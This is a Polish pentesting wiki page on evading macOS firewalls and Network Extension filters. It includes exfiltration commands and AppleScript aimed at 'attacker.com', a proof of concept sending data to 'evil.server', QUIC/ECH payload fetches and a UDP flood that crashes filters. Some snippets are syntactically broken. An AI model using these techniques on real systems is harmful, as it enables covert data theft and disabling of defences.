# Omijanie zapór sieciowych w macOS

{{#include ../../banners/hacktricks-training.md}}

## Znalezione techniki

Poniższe techniki działają w niektórych aplikacjach firewall dla macOS.

### Nadużywanie nazw z listy dozwolonych

- Na przykład uruchamianie malware pod nazwami dobrze znanych procesów macOS, takich jak **`launchd`**

### Synthetic Click

- Jeśli firewall poprosi użytkownika o pozwolenie, spraw, aby malware **kliknęło allow**

### **Używanie binariów podpisanych przez Apple**

- Takich jak **`curl`**, ale także innych, na przykład **`whois`**

### Dobrze znane domeny Apple

Firewall może zezwalać na połączenia ze znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. iCloud może zostać użyty jako C2.

### Ogólne obejście

Kilka pomysłów na obejście firewalli

### Sprawdzanie dozwolonego ruchu

Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalne domeny znajdujące się na liście dozwolonych oraz aplikacje, które mogą uzyskiwać do nich dostęp.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Nadużywanie DNS

Rozwiązywanie nazw DNS odbywa się za pośrednictwem podpisanej aplikacji **`mdnsreponder`**, która prawdopodobnie będzie mieć zezwolenie na kontaktowanie się z serwerami DNS.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Za pośrednictwem aplikacji przeglądarkowych

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Przez wstrzykiwanie do procesów

Jeśli możesz **wstrzyknąć kod do procesu**, który ma uprawnienia do łączenia się z dowolnym serwerem, możesz ominąć zabezpieczenia firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Ostatnie podatności umożliwiające obejście firewall w macOS (2023-2025)

### Obejście filtra treści internetowych (Screen Time) – **CVE-2024-44206**
W lipcu 2024 roku firma Apple załatała krytyczny błąd w Safari/WebKit, który powodował awarię systemowego „filtra treści internetowych” używanego przez kontrolę rodzicielską Screen Time.
Specjalnie spreparowany URI (na przykład z podwójnie zakodowanym URL-em „://”) nie jest rozpoznawany przez ACL Screen Time, ale jest akceptowany przez WebKit, przez co żądanie jest wysyłane bez filtrowania. W rezultacie każdy proces, który może otworzyć URL (w tym kod działający w sandboxie lub niepodpisany), może uzyskać dostęp do domen jawnie zablokowanych przez użytkownika lub profil MDM.<sup>[2]</sup>

Praktyczny test (system bez zainstalowanej poprawki):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Błąd kolejności reguł Packet Filter (PF) we wczesnych wersjach macOS 14 „Sonoma”
Podczas cyklu beta macOS 14 firma Apple wprowadziła regresję w userspace wrapperze wokół **`pfctl`**.
Reguły dodane z użyciem słowa kluczowego `quick` (używanego przez wiele VPN kill-switches) były po cichu ignorowane, powodując traffic leaks, nawet gdy GUI VPN/firewalla informował o *blocked*. Błąd został potwierdzony przez kilku dostawców VPN i naprawiony w RC 2 (build 23A344).

Szybki leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Nadużywanie usług pomocniczych podpisanych przez Apple (starsze — sprzed macOS 11.2)
Przed macOS 11.2 **`ContentFilterExclusionList`** zezwalała około 50 binariom Apple, takim jak **`nsurlsessiond`** i App Store, na omijanie wszystkich firewalli filtrujących sockety, zaimplementowanych za pomocą frameworka Network Extension (LuLu, Little Snitch itd.).
Malware mógł po prostu uruchomić wykluczony proces — lub wstrzyknąć do niego kod — i tunelować własny ruch przez socket, na który zezwolono. Apple całkowicie usunęło listę wykluczeń w macOS 11.2, ale technika ta pozostaje istotna w systemach, których nie można zaktualizować.<sup>[3]</sup>

Przykładowy proof-of-concept (sprzed 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH w celu obejścia filtrów domenowych Network Extension (macOS 12+)
NEFilter Packet/Data Providers opierają się na SNI/ALPN z TLS ClientHello. W przypadku **HTTP/3 over QUIC (UDP/443)** oraz **Encrypted Client Hello (ECH)** SNI pozostaje zaszyfrowane, NetExt nie może przeanalizować przepływu, a reguły hostname często działają w trybie fail-open, pozwalając malware łączyć się z zablokowanymi domenami bez odwoływania się do DNS.<sup>[5]</sup>

Minimalny PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Jeśli QUIC/ECH jest nadal włączone, jest to łatwa ścieżka omijania filtrowania hostname.

### Niestabilność Network Extension w macOS 15 „Sequoia” (2024–2025)
Wczesne buildy 15.0/15.1 powodują awarie filtrów innych firm opartych na **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne itd.). Gdy filtr uruchamia się ponownie, macOS usuwa reguły przepływu, a wiele produktów przechodzi w tryb fail-open. Zalewanie filtra tysiącami krótkich przepływów UDP (lub wymuszanie QUIC/ECH) może wielokrotnie wywołać awarię i pozostawić okno dla C2/exfil, podczas gdy GUI nadal informuje, że firewall działa.<sup>[4]</sup>

Szybka reprodukcja (bezpieczny lab):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Wskazówki dotyczące narzędzi dla nowoczesnego macOS

1. Sprawdź bieżące reguły PF generowane przez firewalle GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Wylicz pliki binarne, które już mają entitlement *outgoing-network* (przydatne do piggy-backingu):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Zarejestruj programistycznie własny filtr treści Network Extension w Objective-C/Swift.
Minimalny rootless PoC przekazujący pakiety do lokalnego socketu jest dostępny w kodzie źródłowym **LuLu** autorstwa Patricka Wardle’a.

## Odnośniki

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Tworzenie i łamanie macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Obejście filtra treści internetowych Apple umożliwia nieograniczony dostęp do zablokowanych treści (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple usuwa funkcję macOS umożliwiającą aplikacjom obejście zabezpieczeń Firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Produkty Cybersecurity przestają działać po aktualizacji macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Użyj ochrony sieci, aby zapobiegać połączeniom macOS z niebezpiecznymi witrynami - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
